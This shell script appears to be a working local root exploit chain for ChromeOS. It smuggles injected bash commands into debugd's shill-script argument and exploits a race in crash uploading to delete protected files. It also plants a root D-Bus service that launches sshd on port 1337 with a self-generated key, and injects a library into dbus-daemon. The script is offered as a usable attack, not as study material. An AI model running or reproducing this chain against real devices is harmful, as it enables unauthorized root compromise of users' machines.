trigger_shillscripts() {
    dbus-send --print-reply --system --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.RunShillScriptStart fd:1 string:set_cellular_ppp array:string:"';bash -c \"sh <(cat /dev/shm/shill-scripts.exploit)\" & echo'" >/dev/null 2>&1
}

get_execdir() {
    dbus-send --print-reply --bus=unix:path=/dev/shm/shill-scripts.sock --dest=a.b.c / a.b.c.d &
    pid=$!
    until [ -e /proc/${pid}/fd/4 ]; do :; done
    exec 4</proc/${pid}/fd/4/
    EXECDIR=/proc/self/fd/4/
    kill ${pid}
}

shillscripts_getid() {
    TMP=$(mktemp -d -p /dev/shm/)
    chmod 777 "${TMP}"
    rm -f /tmp/uploadsinglecrash.lock
    dbus-send --print-reply --system --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.RunShillScriptStart fd:1 string:set_cellular_ppp array:string:"';bash -c \"touch ${TMP}/ready; while [ ! -e /tmp/crash.* ]; do :; done; ls -1d /tmp/crash.* > ${TMP}/crashes\" & echo'" >/dev/null 2>&1
    while [ ! -e ${TMP}/ready ]; do :; done
    uploadsinglecrash /tmp/uploadsinglecrash.lock &
    while [ ! -e ${TMP}/crashes ]; do :; done
    cat ${TMP}/crashes
    touch /tmp/uploadsinglecrash.lock
    rm -rf ${TMP}
}

uploadsinglecrash() {
    ${EXECDIR}/uploadsinglecrash "${1:-/dev/null}"
}

patch_rootdelete() {
    drop_rootdelete /dev/shm/shill-scripts.exploit
    F=$(basename $1)
    D=$(dirname $1)
    ID=$2
    drivefs=$(mount | grep drivefs | awk '{print $3}')

    sed -i "s@__FILE__@$F@" /dev/shm/shill-scripts.exploit
    sed -i "s@__DIR__@$D@" /dev/shm/shill-scripts.exploit
    sed -i "s@__ID__@$ID@" /dev/shm/shill-scripts.exploit
    sed -i "s@__DRIVEFS__@$drivefs@" /dev/shm/shill-scripts.exploit
}

rootdelete() {
    TGT=$1
    while [ -e "${TGT}" ]; do
        echo -e "\tGetting crashid"
        CRASHID=
        while [ -z ${CRASHID} ]; do
            CRASHID=$(shillscripts_getid | cut -d. -f2)
        done
        NEXT_ID=$((CRASHID+1))
        echo -e "\tPatching rootdelete script for ${TGT}, crashid: ${CRASHID}"
        patch_rootdelete ${TGT} ${NEXT_ID}
        pkill -STOP drivefs

        echo -e "\tTriggering race"
        trigger_shillscripts
        until [ -e /dev/shm/ready ]; do :; done
        uploadsinglecrash
        timeout 5 /bin/sh -c "until [ ! -e '${TGT}' ]; do :; done"

        echo -e "\tDelete race complete"

        pkill -CONT drivefs
        sleep 1
    done
}

runasroot() {
    ssh -p 1337 -i /tmp/ssh_host_rsa_key -o StrictHostKeyChecking=no root@127.0.0.1 "$@"
}


repairdbus() {
    runasroot mount -o remount,exec /tmp
    drop_repairdbusso /tmp/repairdbus.so
    drop_injector /tmp/injector
    chmod +x /tmp/injector
    runasroot /tmp/injector /tmp/repairdbus.so $(pidof dbus-daemon)
}

stage_sshd() {
    ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
    mkdir /tmp/root/
    cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
    cat > /tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
    rm -f /home/chronos/user/.ssh/known_hosts
}

drop_sshdservice() {
    cat >> /tmp/org.chromium.exploit.service <<-EOF
[D-BUS Service]
Name=org.chromium.Dlp
Exec=/usr/sbin/sshd -f /tmp/sshd_config
User=root
EOF
}

stage_sshd
drop_sshdservice

drop_shillscriptszip /dev/shm/shill-scripts.zip
